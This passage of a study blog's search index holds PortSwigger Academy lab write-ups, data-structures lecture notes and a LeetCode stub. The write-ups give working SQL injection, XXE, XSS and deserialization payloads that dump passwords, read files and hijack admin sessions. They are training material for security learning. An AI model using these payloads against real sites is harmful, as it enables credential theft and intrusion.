FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwdwQAAAADc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFxAH4AKXg%3D ::: :::spoiler Success Screenshot :::\nReference # Exploiting Java deserialization with Apache Commons (Video solution)\n"},{"id":142,"href":"/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/","title":"Lab: Exploiting XXE via image file upload","section":"Securities","content":" Lab: Exploiting XXE via image file upload # tags: Portswigger Web Security Academy Web # Description: This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files. Goal: To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the \u0026ldquo;Submit solution\u0026rdquo; button to submit the value of the server hostname. Recon # In this lab, we can upload an exploited file which contained malicious xml data. Then we can fetch some sensitive information.\nExp - Upload Exploited File as Avatar # Create an exploit text file We can create a text file contained the payload below The exploited payload in .svg files: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/hostname\u0026#34; \u0026gt; ]\u0026gt;\u0026lt;svg width=\u0026#34;128px\u0026#34; height=\u0026#34;128px\u0026#34; xmlns =\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink =\u0026#34;http://www.w3.org/1999/xlink\u0026#34; version=\u0026#34;1.1\u0026#34;\u0026gt;\u0026lt;text fontsize=\u0026#34;16\u0026#34; x=\u0026#34;0\u0026#34; y=\u0026#34;16\u0026#34;\u0026gt;\u0026amp;xxe;\u0026lt;/text\u0026gt;\u0026lt;/svg\u0026gt; Transfer to svg file and upload it After transfering to .svg file, we can choose arbitrary post and leave a comment below Check your avatar Then you get back to post page and verified your avatar photo should contain a string which is your flag(sensitive data) that you must submit. :::spoiler Success Screenshot :::\n"},{"id":143,"href":"/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/","title":"Lab: Modifying serialized data types","section":"Securities","content":" Lab: Modifying serialized data types # tags: Portswigger Web Security Academy Web # Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos. You can log in to your own account using the following credentials: wiener:peter Background # Loose Comparison Operator in PHP\nPHP based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator(==) when comparing different data types. For example: 5==\u0026quot;5\u0026quot; will be true when two types are different.\nVulnerability:\nThis becomes even stranger when comparing a string the integer 0: 0 == \u0026quot;Example string\u0026quot; // true How about if the website author use this kind of vulnerability as below to verify the admin user?\n$login = unserialize($_COOKIE) if ($login[\u0026#39;password\u0026#39;] == $password) { // log in successfully } Recon # Recon Package According to the package we intercepted, the cookie is set to base64-encoded string: Session: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJmaWtlajZ6ZXN6ZmFudm53b2psYmM2NHllN3dxaG5heSI7fQ%3d%3d Decoded String: O:4:\u0026quot;User\u0026quot;:2:{s:8:\u0026quot;username\u0026quot;;s:6:\u0026quot;wiener\u0026quot;;s:12:\u0026quot;access_token\u0026quot;;s:32:\u0026quot;fikej6zeszfanvnwojlbc64ye7wqhnay\u0026quot;;} What if we modify the string? The verification mechanism workflow is comparing the query user\u0026rsquo;s access_token with its database data.\nExp # Modify the string like below Change the user to administrator and access token to integer 0 so that the comparison is always true. Exploit Payload: O:4:\u0026quot;User\u0026quot;:2:{s:8:\u0026quot;username\u0026quot;;s:13:\u0026quot;administrator\u0026quot;;s:12:\u0026quot;access_token\u0026quot;;i:0;} Then we have admin panel on the screen. Delete Carlos like previous lab :::spoiler Success Screenshot :::\nReference # "},{"id":144,"href":"/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/","title":"Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:","section":"Securities","content":" Lab: SQL injection attack, listing the database contents on non-Oracle databases :four: # tags: Portswigger Web Security Academy Web # Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables. The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. Goal: To solve the lab, log in as the administrator user. Exp # Determine # of columns Payload: ?category=Gifts' union select NULL,NULL --\nDetermine which column contained text string Payload: ?category=Gifts' union select 'a','b' --\nAccording to cheat sheet We can use information_schema.tables to search table_name For instance: SELECT * FROM information_schema.tables Payload: ?category=Gifts' union SELECT TABLE_NAME,NULL FROM information_schema.tables-- :::spoiler Result :::\nThen tried the specific one - users_rjrgxf Payload: ?category=Gifts' union SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'users_rjrgxf'-- :::spoiler Result :::\nTried dig deeper Payload: ?category=Gifts' union SELECT username_ngqqos,password_jraqsv FROM users_rjrgxf-- Then you\u0026rsquo;ll get the password of administrator $\\to$ login directrly :::spoiler Success Screenshot :::\nReference # "},{"id":145,"href":"/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/","title":"Lab: SQL injection attack, listing the database contents on Oracle","section":"Securities","content":" Lab: SQL injection attack, listing the database contents on Oracle # tags: Portswigger Web Security Academy Web # Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables. The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. Goal: To solve the lab, log in as the administrator user. Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual Exp # Determine # of columns Payload: ?category=Lifestyle' union select NULL,NULL from dual--\nDetermine which column contained text string Payload: ?category=Lifestyle' union select 'a','b'from dual--\nAccording to cheat sheet We can use all_tables to search table_name For instance: SELECT * FROM all_tables Payload: ?category=Lifestyle' union select table_name,NULL from all_tables-- :::spoiler Result :::\nThen tried the specific one - USERS_LXJEEY Payload: ?category=Gifts' union SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_LXJEEY'-- :::spoiler Result :::\nTried dig deeper Payload: ?category=Gifts' union SELECT USERNAME_YRYUYR,PASSWORD_OUTVCI FROM USERS_LXJEEY-- :::spoiler Result ::: Finally, we know the password of administrator is z0mtqaim65dnb4yo034l :::spoiler Success Screenshot :::\nReference # "},{"id":146,"href":"/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/","title":"Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft","section":"Securities","content":" Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft # tags: Portswigger Web Security Academy Web # Description: his lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. Goal: To solve the lab, display the database version string. Exp # Consider # of column Payload: ?category=Accessories' union select NULL,NULL -- # Consider column type Payload: ?category=Accessories' union select 'a','a' -- # Both of them contained text. Attack Payload: ?category=Accessories' union select 'abc',@@version -- # :::spoiler Success Screenshot ::: Reference # "},{"id":147,"href":"/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/","title":"Lab: SQL injection attack, querying the database type and version on Oracle","section":"Securities","content":" Lab: SQL injection attack, querying the database type and version on Oracle # tags: Portswigger Web Security Academy Web # Description: This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. Our Goal: To solve the lab, display the database version string. Exp - SQLi Cheat Sheet - Examining the database in SQL injection attacks # According to the cheat sheet above, we can use the command to fetch the version of this database, e.g. :::warning Before the recon, the hint told you that this database is created by Oracle. So, you must contained From preserved word in each query, e.g. SELECT 'abc' FROM dual :::\nDetermine # of columns that are being returned by the query Payload: ?category=Gifts' union select NULL,NULL from v$version--\nWhich columns contain text data Payload: ?category=Gifts' union select 'a','b' from v$version-- Two of them are text data\nAttack Payload: ?category=Gifts' UNION SELECT BANNER,'abc' FROM v$version-- :::spoiler Result :::\nReference # "},{"id":148,"href":"/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/","title":"Lab: SQL injection UNION attack, determining the number of columns returned by the query","section":"Securities","content":" Lab: SQL injection UNION attack, determining the number of columns returned by the query # tags: Portswigger Web Security Academy Web # Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack. Hint: To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. Exp # Payload: https://0ab2008b04e96b8f8057358e008d00d0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL-- :::spoiler Success Screenshot :::\nReference # "},{"id":149,"href":"/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/","title":"Lab: SQL injection UNION attack, finding a column containing text","section":"Securities","content":" Lab: SQL injection UNION attack, finding a column containing text # tags: Portswigger Web Security Academy Web # Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. Hint: The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. Exp # Determine how many columns it has You can use the technique from previous question. Payload: ?category=' UNION SELECT NULL,NULL,NULL--\nStart to guess which column contains text For example: ?category=Accessories' UNION (SELECT 'a', NULL, NULL)-- $\\to$ Internal Server Error ?category=Accessories' UNION (SELECT NULL, 'a', NULL)-- $\\to$ No Error ?category=Accessories' UNION (SELECT NULL, NULL, 'a')-- $\\to$ Internal Server Error\nThen we can consider which column is text-based string\nPayload: ?category=Accessories' UNION (SELECT NULL, 'DoimDt', NULL)-- :::spoiler Success Screenshot :::\nReference # "},{"id":150,"href":"/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/","title":"Lab: SQL injection UNION attack, retrieving data from other tables","section":"Securities","content":" Lab: SQL injection UNION attack, retrieving data from other tables # tags: Portswigger Web Security Academy Web # Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs. Hint: The database contains a different table called users, with columns called username and password. To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. Exp # Using all technique we learned before According to union-based technique we learned before, we can consider there\u0026rsquo;re 2 columns in this database and both of them are text strings Payload: ?category=Lifestyle' UNION SELECT 'Title name','Post content'-- Find the detailed info in users table Payload: ?category=Lifestyle' UNION SELECT username, password FROM users-- Login as administrator Username: administrator Password: 5kg73b7jinl9plif82d3 :::spoiler Success Screenshot ::: Reference # "},{"id":151,"href":"/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/","title":"Lab: SQL injection UNION attack, retrieving multiple values in a single column","section":"Securities","content":" Lab: SQL injection UNION attack, retrieving multiple values in a single column # tags: Portswigger Web Security Academy Web # Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables. Hint: The database contains a different table called users, with columns called username and password. To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. Exp # Consider how many columns in this table Payload: ?category=Lifestyle' UNION SELECT NULL,NULL-- Consider the type of each columns Payload: ?category=Lifestyle' UNION SELECT 1,'a'-- As the payload above, the 1st column is number-based string, and 2nd column is text-based string. :::spoiler Result ::: 通靈: Find username and password From the result above, there\u0026rsquo;s just one column is text-based string that we can inject, so we can use concatenate operator || to concatenate two strings that we query together. Payload: ?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users-- :::spoiler Result ::: Login by username and password that we fetch :::spoiler Success Screenshot ::: Reference # "},{"id":152,"href":"/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/","title":"Lab: Stored DOM XSS","section":"Securities","content":" Lab: Stored DOM XSS # tags: Portswigger Web Security Academy Web # Description: This lab demonstrates a stored DOM vulnerability in the blog comment functionality. Goal: To solve this lab, exploit this vulnerability to call the alert() function. Recon # Find the injected place According to the description, we know that the comment place of each post has some problems. So, we can try to inject something.\nTry to inject Comment Payload: \u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt; Seems weird, and when you browse the page source, you\u0026rsquo;ll find out that it calls external js files to import the comment, i.e.: What is loadCommentsWithVulnerableEscapeHtml.js The main purpose of this file is to load the comment into the page and filter some sensitive characters. :::spoiler A part of source code\n... function escapeHTML(html) {return html.replace(\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026amp;lt;\u0026#39;).replace(\u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026amp;gt;\u0026#39;);} ... ::: However\u0026hellip; :::danger According to JavaScript Document :::\nTry to inject more \u0026lt;\u0026gt; char Comment Payload: \u0026lt;\u0026gt;\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt; Seems it can be injected but can not be rendered properly because the comments are loaded from external space. So, we could change our payload to img tag.\nExp # New Comment Payload: \u0026lt;\u0026gt;\u0026lt;img src=\u0026quot;a\u0026quot; onerror=\u0026quot;alert(123)\u0026quot;\u0026gt; :::spoiler Success Screenshot :::\nReference # "},{"id":153,"href":"/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/","title":"Lab: Using application functionality to exploit insecure deserialization","section":"Securities","content":" Lab: Using application functionality to exploit insecure deserialization # tags: Portswigger Web Security Academy Web # Description: This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.\nGoal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos\u0026rsquo;s home directory.\nYou can log in to your own account using the following credentials: wiener:peter You also have access to a backup account: gregg:rosebud\nRecon # Login and Recon When you\u0026rsquo;d like to delete an account, the package would be like as below: Session: Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJzdHB4YXlzZzRtdzJ4MHo5c3h2ajE4N3dmZWEweGY5NSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d Decoded String: O:4:\u0026quot;User\u0026quot;:3:{s:8:\u0026quot;username\u0026quot;;s:6:\u0026quot;wiener\u0026quot;;s:12:\u0026quot;access_token\u0026quot;;s:32:\u0026quot;stpxaysg4mw2x0z9sxvj187wfea0xf95\u0026quot;;s:11:\u0026quot;avatar_link\u0026quot;;s:19:\u0026quot;users/wiener/avatar\u0026quot;;}\nYou can observe that it\u0026rsquo;s not only delete your whole account but your avatar image. In addition, it provide the avatar link in decoded string: users/wiener/avatar\nHow about we modify the delete path?(通靈)\nExp - Change the delete path # Exploit Payload:\nO:4:\u0026#34;User\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:6:\u0026#34;wiener\u0026#34;;s:12:\u0026#34;access_token\u0026#34;;s:32:\u0026#34;stpxaysg4mw2x0z9sxvj187wfea0xf95\u0026#34;;s:11:\u0026#34;avatar_link\u0026#34;;s:23:\u0026#34;/home/carlos/morale.txt\u0026#34;;} :::spoiler Success Screenshot :::\n"},{"id":154,"href":"/data-structure/lecture-10/","title":"Lecture 10","section":"Data Structures","content":" Lecture 10 # tags: Data Structure NYCU # Reference # Lec10 資料結構 第六週課程\nRewind # Stack / Queue也可以用link-list實作，所以兩者不能和array畫上等號，只能說兩者都是一種data structure，只是用不同方式implement而已 :::spoiler Implementation Example ::: 之前提到的多項式也可以用link-list實作，同樣也可以解決sparse的問題 :::spoiler Implementation Example ::: Free pool的概念就是像glibc中那樣的回收場(Fast bin/Small bin/Large bin/Unsorted bin) Equivalence Relations # A relation over a set, S, is said to be an equivalence relations over S iff it is symmetric, reflexive, and transitive over S.\nreflexive, x=x symmetric, if x=y, then y=x transitive, if x=y and y=z, then x=z Example\nInput: pairs of numbers 0=4,3=1,6=10,8=9,7=4,6=8,3=5,2=11,11=0 Output: equivalent sets three equivalent classes {0, 2, 4, 7, 11};{1, 3, 5};{6, 8, 9, 10} How to implement? Phase 1: 先看過所有的組合然後用link-list的方式建一個表格，如上圖，就可以知道誰和誰有關係 Phase 2: 最後印出來，簡單來說就是從頭開始檢查，如果印出來後，專門儲存的array會把相對應的index設定成false，例如：0和11還有4有關係(print 0 and 11 and 4)，而11和0,2有關係(print 2 only)，接著2又和11有關係，此時因為11已經被設定成false，這樣的話就結束這個round，換下一個數值(4)繼續挖掘，4和7, 0有關係(print 7 only)而7又和4有關係，此時繞回來了，這樣就接著往下看, so on and so on until print all of the value or the final index. void equivalence() // Input the equivalence pairs and output the equivalence classes { ifstream inFile(\u0026#34;equiv.in\u0026#34;, ios::in); //\u0026#34;equiv.in\u0026#34; is the input file if(!inFile) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot open input file\u0026#34; \u0026lt;\u0026lt; endl; return ; } int i, j, n; inFile \u0026gt;\u0026gt; n; // read number of objects // initialize seq and out ListNodePtr *seq = new ListNodePtr[n]; Boolean *out = new Boolean[n]; for (i=0; i\u0026lt;n; i++) { seq[i] = 0; out[i] = False; } } // Phase 1: input equivalence pairs inFile \u0026gt;\u0026gt; i \u0026gt;\u0026gt; j; while(inFile.good()) { // check end of file ListNode *x = new ListNode(j); x-\u0026gt;link = seq[i]; seq[i] = x; // add j to seq[i] ListNode *y = new ListNode(i); y-\u0026gt;link = seq[j]; seq[j] = y; // add j to seq[j] inFile \u0026gt;\u0026gt; i \u0026gt;\u0026gt; j; } // Phase 2: output equivalence classes for (i=0; i\u0026lt;n; i++) { if (out[i] == False) { cout \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; \u0026#34;A new classes: \u0026#34; \u0026lt;\u0026lt; i; // for example, i = 0, Output: 0 out[i] = True; ListNode *x = seq[i]; ListNode *top = o; // init stack while (1) { // find rest of class while(x) { // process the list j = x -\u0026gt; data; // when i=0, j=11 if (out[j] == False) { cout \u0026lt;\u0026lt; \u0026#34;, \u0026#34; \u0026lt;\u0026lt; j; out[j] = True; ListNode *j = x-\u0026gt;link; // when i = 0 in the first round, y = 4 x-\u0026gt;link = top; top = x; // in stack, top point to node 11 x = y; } else x = x-\u0026gt;link; } // end of while(x) if (!top) break; else { x = seq[top-\u0026gt;data]; top = top-\u0026gt;link; //unstack } } // end of while(1) } // end of if(out[i] == False) } Note # Link-list也可以解決sparse matrix(用環狀的link-list) 每一個row / column都有自己的Link-list 黃色的head node看起來有8個但其實只有四個，只是為了表示方便所以畫起來長這樣 How to implement?\nenum Boolean {False, True}; struct Triple {int value, row, col;}; class Matrix; // forward declaration class MatrixNode { friend class Matrix; // for reading in a matrix friend istream\u0026amp; operation \u0026gt;\u0026gt; (istream\u0026amp;, Matrix\u0026amp;); private: MatrixNode *down, *right; Boolean head; union { // anonymous union MatrixNode *next; Triple triple; }; MatrixNode(Boolean, Triple *); // constrctor }; MatrixNode::MatrixNode(Boolean b, Triple *t) // constructor { head = b; if (b){right = next = down = this;} // row/column head node else triple = *t; // head node for list of headnodes OR element // node } typedef MatrixNode * MatrixNodePtr; // to allow subsequent creation of array of pointers class Matrix { friend istream\u0026amp; operator \u0026gt;\u0026gt; (istream\u0026amp;, Matrix\u0026amp;); public: ~Matrix(); // destructor private: MatrixNode *headnode; } "},{"id":155,"href":"/data-structure/lecture-2/","title":"Lecture 2","section":"Data Structures","content":" Lecture 2 # tags: Data Structure NYCU # [TOC]\nReference # Lec02 資料結構 第二週課程\nNote # Recursive Algorithms # Type # Direct Recursion: 簡單來說就是自己呼叫自己 Indirect Recursion: A calls B $\\to$ B calls itself Boundary Condition # Recursive algorithm是會停止的，如果他能夠寫出一個完整的通式或過程，就代表有上限，當達到這個上限時就會停止 :::spoiler Example :::\nApplication of Recursive Function # Permutation Detailed description can browse the original video 如果不用Recursive解決Permutation的問題，可以考慮用For-Loop但是要考慮重複出現的問題 :::spoiler Example 在這個例子中boundary condition就是只剩下一個字元需要做排列的時候 :::\nBinary Search :::spoiler Example :::\nPerformance Analysis # 如何判斷一個演算法的好壞\nComplexity Theory # Space Complexityfont\u0026gt;: amount of memory $\\to$ $S(P)=c+S_p(I)$ where $c$ is a constant(有多少固定的空間被用掉了，e.g. instruction, simple variables, constants) and $S_p$ is depends on characteristics of instance $I$ Time Complexityfont\u0026gt;: amount of computer time $\\to$ $T(P)=c+T_p(I)$ where $c$ is a constant(有多少固定的時間被用掉了，e.g. compile time) and $S_p$ is program execution depends on characteristics of instance $I$ :::info Run(Execution) Time $T_p(n)=c_aADD(n)+c_sSUB(n)+c_lLDA(n)+c_{st}STA(n)$ where $LDA$ is the time by loading something and $STA$ is the time by storing something ::: How to know how many step in one program? - Purpose: Compute Time Complexity # Use Count Variable :::spoiler Example ::: Use Tabular Method :::spoiler Example ::: :::warning :::\n"},{"id":156,"href":"/data-structure/lecture-4/","title":"Lecture 4","section":"Data Structures","content":" Lecture 4 # tags: Data Structure NYCU # Reference # Lec04 資料結構 第三週課程\nNote # Array # 用array表達一個多項式 $\\to$ e.g.: $$ A(X)=3X^{20}+2X^{5}+4\\ B(X)=X^{4}+10X^{3}+1 $$\nType 1 # 多項式的係數就是Array中存放的element，而指數代表Array的index 缺點： 如下圖的$A(X)$，如果有一個sparse的array，這樣開的空間就只會有兩個index有存放數值，其他就會被浪費掉 Type 2 # 老師表示回家自己看書\nType 3 # 用一個global array存放所有的多項式，以上圖為例，global array存放$A(X)$和$B(X)$，存放index和相對應的coefficient :::info How to implement? Refer to original video at timestamp 5:30 ::: :::danger 如果Global Array滿了怎麼辦?最簡單的作法是看前面有無可回收的多項式(寫在Descrutor) :::\nMatrix # 最簡單的就是直接declare一個2-dim的陣列，存放矩陣的element，缺點也和上面提到的sparse array一樣會有sparse matrix，如果太多index沒有存放東西，就會很浪費\nSparse Matrix Solution # 直接紀錄該位置不是零的那些index的row和column就結束了(我也有想到)，排序是先看row再看column(1-dim的array) e.g. :::info 如何implement transportation?最簡單的做法就是row和column互換，再做排序(一樣是先依照row再看column) :::\n"},{"id":157,"href":"/data-structure/lecture-6/","title":"Lecture 6","section":"Data Structures","content":" Lecture 6 # tags: Data Structure NYCU # [TOC]\nReference # Lec06 資料結構 第四週課程 [C/C++] C/C++ 箭頭(-\u0026gt;) 、點(.)、雙冒號(::) 用法\nRewind # String Matching Task # 最笨的作法是一個字元依依比對 KMP Algorithm # 有沒有可能一次不要只移動一個字元， 又充分利用已經比對過的資訊進行位移 原理 # 運用到的就是建立一個Failure Function，如下圖為例，在index=5的地方failure function是3，代表從index=5往回看3個字元，會和整個字串的開頭往後看3個字元會相等 這樣的話就可以快速的移動比對的字串，例如下圖，index i和j不相等，則可以往回看j-1的failure function儲存的相等字元有多少，如果是3代表可以直接移動到P到相等字元的地方(也就是p[3+1]的地方開始比對)，也就是粉紅色的地方對齊，這樣的話就可以移動不只一個字元 Implementation # :::info Prefix (Failure) Function can refer to 1:05:00 KMP Matcher can refer to orignal video at timestamp 1:14:00 實際操作：1:14:10 :::\nOrder # 此演算法有分兩個phase，前一個是要計算failure function $O(m)$，後一個phase是matching $O(n)$ 所以總共是：$O(m+n)$\nNote # Stack # Last In First Out Top Pointer永遠指向最後進來的element Application\nFunction Call的Return Address或是其他Passing Parameters都會儲存在Stack中 Implementation :::info How to implement? Array Or Link List ::: :::spoiler Structure\nTemplate \u0026lt;class KeyType\u0026gt; class Stack {// objects: A finite ordered list with zero or more elements public: Stack (int MaxStackSize = DefaultSize); // Create an empty stack whose maximum size is MarStackSize Boolean IsFull(); // if number of elements in the stack is equal to the maximum size // of the stack, return TRUE(1) else return FALSE(0) void Add(const KeyType\u0026amp; item); // if IsFull(), then StackFull(); else insert item into the top of the stack. Boolean IsEmpty(); // if number of elements in the stack is 0, return TRUE(1) else return FALSE(0) KeyType* Delete(KeyType\u0026amp;); // if IsEmpty(), then StackEmpty() and return O; // else remove and return a pointer to the top element of the stack. private: int top; KeyType *stack; int MaxSize, template\u0026lt;class KeyType\u0026gt; Stack\u0026lt;KeyType\u0026gt;::Stack(int MaxStackSize):MaxSize(Max.StackSize) { stack=new KeyType(MaxSize), top=-1; } template\u0026lt;classs KeyType\u0026gt; inline Boolean Stack\u0026lt;KeyType\u0026gt;::IsFul1() { if (top==MarSize-1) return TRUE, else return FALSE; } template\u0026lt;classs KeyType\u0026gt; inline Boolean Stack\u0026lt;KeyType\u0026gt;::IsEmpty() { if (top==-1)return TRUE; else return FALSE; } }; :::\n:::spoiler Add to a stack\nTemplate \u0026lt;class KeyType\u0026gt; void Stack\u0026lt;Key Type\u0026gt;::Add(const KeyType\u0026amp; x) { /* add an item to the global stack */ if (IsFull()) stack_full( ); else stack[++top]-x; } :::\n:::spoiler Delete from a stack\nTemplate \u0026lt;class Key Type\u0026gt; KeyType*Stack\u0026lt;KeyType\u0026gt;::Delete(KeyType\u0026amp;x) { /* return the top element from the stack */ if (IsEmpty()) { stack_empty( ); /* returns and error key return 0; } x=stack[top--]; return \u0026amp;x; } :::\nQueue # First In First Out Application\n在OS中的Job Scheduling的其中一種方式，誰先進入這個Queue，OS就先服務誰，但這個方式很不好，如果第一個Job的工作量很大，則後面其他Job的waiting time就會很長，所以另外一種方式是利用Priority Queue的方式 Implementation :::spoiler Abstract Data Type of Queue\nTemplate \u0026lt;class KeyType\u0026gt; class Queue { // objects: A finite ordered list with zero or more elements public: Queue(int MaxQueueSize = DefaultSize); // Create an empty queue whose maximum size is MaxQueueSize Boolean IsFull(); // if number of elements in the queue is equal to the maximum size of // the queue, return TRUE(1); otherwise, return FALSE(0) void Add(const KeyType\u0026amp; item); // if IsFull(), then QueueFull(); else insert item at rear of the queue Boolean IsEmptyO; l/ if number of elements in the queue is equal to O, return TRUE(1) l/ else retur FALSE(0) KeyType* Delete(KeyType\u0026amp;); // if IsEmptyO, then QueueEmpty() and return O; // else remove the item at the front of the queue and return a pointer to it } :::\n"},{"id":158,"href":"/data-structure/lecture-8/","title":"Lecture 8","section":"Data Structures","content":" Lecture 8 # tags: Data Structure NYCU # Reference \u0026amp; Background # Lec08 資料結構 第五週課程 C語言: 超好懂的指標，初學者請進～\nNote # Rewind # Array 之前提到Array的結構，其缺點是大小是固定的，但有時候需要儲存的東西可能是動態改變的，且沒有用到的空間就會變成一種浪費 Solution 此時就可能可以考慮用Link-List的結構處理這樣的資料 Link-List # 主要結構 每一個Element都會有兩個儲存單位，一個是儲存資料本體，另一個是儲存pointer，指向下一個Element的位置 Insert GAT Create新的node，儲存GAT，並改變前後的指標，原本FAT的指標要assign給GAT的pointer，然後GAT的位址也要assign給FAT Delete GAT 把HAT的位址assign給FAT 缺點：如果要delete某一個Element就需要\u0026quot;先找到該Element的位置在哪裡\u0026quot;，如果Link-List 很長，則要做到這件事情的Overhead就會很高 Solution: Double-Link-List，可以從前後同時找要刪除的Element，這樣的話就會比較快 Implement # :::spoiler Source Code - Composite Classes\nclass ThreeLetterList; // forward delcanon class ThreeLetterNode { friend class ThreeLetterList; private char data[3]; // 每一個Elment就是只有儲存三個字元 ThreeLetterNode *link; }; class ThreeLetterList{ public: // List Manipulat10n operabons private: ThreeLetterNode *first; }; :::\n:::spoiler Another Implementation - Nested Classes\nclass ThreeLetterList{ public: // List ManipuIation operatlons private: class ThreeLetterNode{ // nested class public: char data[3]; ThreeLetterNode *link; }; ThreeLetterNode *first; }; :::\nHow to create 2 link-list element :::spoiler Example Code\nvoid List::Create2() { /* create a linked list with two nodes */ first = new ListNode(10); first-\u0026gt;link = new ListNode(20); } ListNode::ListNode(int element=0) { data = element; link = 0; } ::: How to insert 50 in a existed link-list :::spoiler Example Code\nvoid List::Insert50 (ListNode *x) { /* insert a new node with data=50 into the list* */ ListNode *t = new ListNode(50); if (!first) { first = t; return; } //insert after x t-\u0026gt;link = x-\u0026gt;link; x-\u0026gt;link = t; } ::: "},{"id":159,"href":"/leetcode/easy/leetcode---two-sum/","title":"LeetCode - Two Sum","section":"LeetCodes","content":" LeetCode - Two Sum # Recon \u0026amp; Description # :::spoiler Description Given an array of integers nums and an integer target, return indices of the two numbers such that they add up to target.\nYou may assume that each input would have exactly one solution, and you may not use the same element twice.\nYou can return the answer in any order.\nExample 1:\nInput: nums = [2,7,11,15], target = 9 Output: [0,1] Explanation: Because nums[0] + nums[1] == 9, we return [0, 1]. Example 2:\nInput: nums = [3,2,4], target = 6 Output: [1,2] Example 3:\nInput: 